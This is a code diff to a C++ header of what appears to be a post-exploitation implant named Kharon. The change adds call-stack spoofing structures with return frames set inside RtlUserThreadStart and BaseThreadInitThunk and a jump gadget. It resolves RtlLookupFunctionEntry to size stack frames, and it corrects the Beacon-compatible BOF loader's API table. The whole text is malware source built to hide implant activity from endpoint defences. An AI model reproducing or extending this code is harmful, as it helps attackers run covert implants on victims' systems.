@@ -252,16 +252,6 @@ namespace Root {
         Package*   Pkg;
     
         struct {
-            UPTR Handle;
-
-            DECLAPI( vprintf );
-            DECLAPI( vsnprintf );
-        } Msvcrt = {
-            RSL_TYPE( vprintf ),
-            RSL_TYPE( vsnprintf ),
-        };
-
-        struct {
             ULONG AllocGran;
             ULONG PageSize;
             PCHAR CompName;
@@ -372,6 +362,20 @@ namespace Root {
             RSL_TYPE( recv ),
             RSL_TYPE( ioctlsocket ),
             RSL_TYPE( freeaddrinfo )
+        };
+
+        struct {
+            UPTR Handle;
+        } KrnlBase;
+
+        struct {
+            UPTR Handle;
+
+            DECLAPI( vprintf );
+            DECLAPI( vsnprintf );
+        } Msvcrt = {
+            RSL_TYPE( vprintf ),
+            RSL_TYPE( vsnprintf ),
         };
 
         struct {
@@ -589,6 +593,8 @@ namespace Root {
         struct {
             UPTR Handle;
 
+            DECLAPI( RtlLookupFunctionEntry );
+
             DECLAPI( RtlNtStatusToDosError );
             DECLAPI( DbgPrint );
             DECLAPI( NtClose );
@@ -657,6 +663,8 @@ namespace Root {
             DECLAPI( RtlEnterCriticalSection );
             DECLAPI( RtlDeleteCriticalSection );
         } Ntdll = {
+            RSL_TYPE( RtlLookupFunctionEntry ),
+
             RSL_TYPE( RtlNtStatusToDosError ),
             RSL_TYPE( DbgPrint ),
             RSL_TYPE( NtClose ),
@@ -974,6 +982,20 @@ public:
     ) -> VOID;
 };
 
+struct _FRAME_INFO {
+    UPTR Lib;  // function module
+    UPTR Ptr;  // pointer to function + offset
+    UPTR Size; // stack size
+};
+typedef _FRAME_INFO FRAME_INFO;
+
+struct _GADGET_INFO {
+    UPTR Lib;  // function module
+    UPTR Ptr;  // pointer to gadget
+    UPTR Size; // stack size
+};
+typedef _GADGET_INFO GADGET_INFO;
+
 class Spoof {
 private:
     Root::Kharon* Self;    
@@ -984,17 +1006,21 @@ public:
     BOOL ProxyCall = KH_PROXY_CALL;
 
     struct {
-        UPTR FirstFrame;   // RtlUserThreadStart+0x2c
-        UPTR SecondFrame;  // BaseThreadInitThunk+0x17
-        UPTR FirstSize;
-        UPTR SecondSize;
-        UPTR JmpGadget;
-        UPTR JmpRef;
+        FRAME_INFO First;  // RtlUserThreadStart+0x21
+        FRAME_INFO Second; // BaseThreadInitThunk+0x14
+        FRAME_INFO Gadget;
+        
         UPTR ArgCount;
         UPTR Args[8];
     } Setup = {
-        .FirstFrame  = (UPTR)this->Self->Ntdll.RtlUserThreadStart + 0x2c,
-        .SecondFrame = (UPTR)this->Self->Krnl32.BaseThreadInitThunk + 0x17,
+        .First { 
+            .Lib = this->Self->Ntdll.Handle,
+            .Ptr = (UPTR)this->Self->Ntdll.RtlUserThreadStart + 0x21
+        },
+        .Second{
+            .Lib = this->Self->KrnlBase.Handle,
+            .Ptr = (UPTR)this->Self->Krnl32.BaseThreadInitThunk + 0x14,
+        }
     };
 
     auto TimerCall(
@@ -1014,7 +1040,7 @@ public:
         Args... args
     );
 
-    auto GetStackSize(
+    auto StackSize(
         _In_ UPTR  LibBase,
         _In_ PVOID UnwInfo
     ) -> ULONG;
@@ -1059,7 +1085,7 @@ struct _USER_DATA {
     PVOID  Ptr;
     struct _USER_DATA* Next;
 };
-typedef _USER_DATA USER_DATA;
+typedef _USER_DATA VALUE_DICT;
 
 class Coff {
 public:
@@ -1071,7 +1097,7 @@ public:
 
     BOOL Hook = KH_BOF_HOOK_ENALED;
 
-    USER_DATA* UserData  = nullptr;
+    VALUE_DICT* UserData  = nullptr;
     BOF_OBJ*   Node      = nullptr;
     ULONG      ObjCount  = 0;
 
@@ -1114,7 +1140,7 @@ public:
         ApiTable[20] = { Hsh::Str("BeaconFormatAppend"),           reinterpret_cast<PVOID>(&Coff::FmtAppend) },
         ApiTable[21] = { Hsh::Str("BeaconFormatFree"),             reinterpret_cast<PVOID>(&Coff::FmtFree) },
         // ApiTable[22] = { Hsh::Str("BeaconFormatToString"),      reinterpret_cast<PVOID>(&Coff::FmtToString) },
-        ApiTable[23] = { Hsh::Str("BeaconFormatInt"),              reinterpret_cast<PVOID>(&Coff::FmtFree) },
+        ApiTable[23] = { Hsh::Str("BeaconFormatInt"),              reinterpret_cast<PVOID>(&Coff::FmtInt) },
         ApiTable[24] = { Hsh::Str("BeaconFormatPrintf"),           reinterpret_cast<PVOID>(&Coff::FmtPrintf) },
         ApiTable[25] = { Hsh::Str("BeaconFormatReset"),            reinterpret_cast<PVOID>(&Coff::FmtReset) },
     };
@@ -2559,7 +2585,7 @@ public:
     ) {
         if ( AttrBuff ) {
             Mem::Zero( U_PTR( AttrBuff ), AttrSize );
-            Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, C_PTR( AttrBuff ) );
+            Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, PTR( AttrBuff ) );
             Krnl32.DeleteProcThreadAttributeList( AttrBuff );
         }
     }
